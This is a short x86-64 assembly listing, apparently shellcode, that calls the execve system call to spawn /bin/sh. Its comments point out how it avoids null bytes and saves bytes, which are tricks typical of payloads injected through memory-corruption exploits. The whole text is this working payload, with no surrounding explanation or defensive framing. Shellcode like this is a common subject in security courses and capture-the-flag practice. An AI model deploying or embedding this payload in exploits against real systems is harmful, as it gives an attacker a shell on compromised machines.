BITS 64

section .text
global _start

_start:
    xor  rax, rax       ; rax = 0
    push rax            ; push 0x00 to stack (null byte)
    xor  rsi, rsi       ; rsi = 0 (NULL)
    xor  rdx, rdx       ; rdx = 0 (NULL)
    mov  rbx, '/bin/sh' ; /bin/sh
    push rbx            ; push str to stack
    push rsp            ; rsp is pointing to str, push to stack
    pop  rdi            ; now pop that address off stack, indirect way, but saves a byte!
    mov  eax, 59        ; sys_execve
    syscall
